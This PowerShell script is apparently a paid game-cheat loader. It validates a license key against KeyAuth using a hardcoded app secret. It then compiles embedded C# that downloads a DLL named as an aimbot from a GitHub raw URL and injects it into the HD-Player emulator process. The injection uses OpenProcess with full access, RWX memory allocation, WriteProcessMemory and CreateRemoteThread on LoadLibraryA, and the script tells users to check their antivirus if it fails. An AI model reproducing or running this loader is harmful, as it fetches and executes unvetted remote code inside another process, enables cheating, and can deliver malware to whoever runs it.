[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- App Config ---
$Name    = "Babybas4446's Application"
$OwnerID = "w9341Depcn"
$Secret  = "84618769c55040980c6e18333ee4dd8d8720c30312fa5591577b0ded60cb8ecd"
$Version = "1.0"
$dllUrl  = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/main/AimbotFemaleFix.dll"
$target  = "HD-Player"

function Show-Auth {
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX ELITE     " -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        $key = Read-Host " Enter License Key"
        $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
        $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$($initRes.sessionid)&name=$($Name -replace ' ', '%20')&ownerid=$OwnerID"
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        return $loginRes.success -eq $true
    } catch { return $false }
}

if (Show-Auth) {
    Write-Host "[+] Authentication Verified." -ForegroundColor Green

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Net;
    using System.Text;
    using System.IO;

    public class ForceNode {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool i, int p);
        [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint pr);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
        [DllImport("kernel32.dll")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint n, out uint o);
        [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr at, uint st, IntPtr sr, IntPtr pa, uint f, IntPtr id);

        public static bool Inject(string url, int pid) {
            try {
                WebClient wc = new WebClient();
                byte[] dllData = wc.DownloadData(url);
                string path = Path.Combine(Path.GetTempPath(), "AimbotFix.dll");
                File.WriteAllBytes(path, dllData);

                // Open with ALL_ACCESS (Same as Process Hacker)
                IntPtr hProc = OpenProcess(0x1F0FFF, false, pid);
                if (hProc == IntPtr.Zero) return false;

                IntPtr alloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)path.Length + 1, 0x3000, 0x40);
                IntPtr written;
                WriteProcessMemory(hProc, alloc, Encoding.ASCII.GetBytes(path), (uint)path.Length + 1, out written);

                // FORCE: Unlock memory protection before loading
                uint oldP;
                VirtualProtectEx(hProc, alloc, (uint)path.Length + 1, 0x40, out oldP);

                IntPtr hKern = GetModuleHandle("kernel32.dll");
                IntPtr hLoad = GetProcAddress(hKern, "LoadLibraryA");
                IntPtr hThrd = CreateRemoteThread(hProc, IntPtr.Zero, 0, hLoad, alloc, 0, IntPtr.Zero);

                return hThrd != IntPtr.Zero;
            } catch { return false; }
        }

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lp);
        [DllImport("kernel32", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    }
"@
    Add-Type -TypeDefinition $Source

    Write-Host "[*] Searching for $target..." -ForegroundColor Cyan
    while ($true) {
        $p = Get-Process $target -ErrorAction SilentlyContinue
        if ($p) {
            Write-Host "[!] Target found. Using Process Hacker technique..." -ForegroundColor Yellow
            if ([ForceNode]::Inject($dllUrl, $p.Id)) {
                Write-Host "[+] DONE! AimbotFemaleFix Injected." -ForegroundColor Green
                break
            } else {
                Write-Host "[-] Injection failed. Check Antivirus/Administrator!" -ForegroundColor Red
                Start-Sleep -Seconds 5
            }
        }
        Start-Sleep -Seconds 2
    }
}
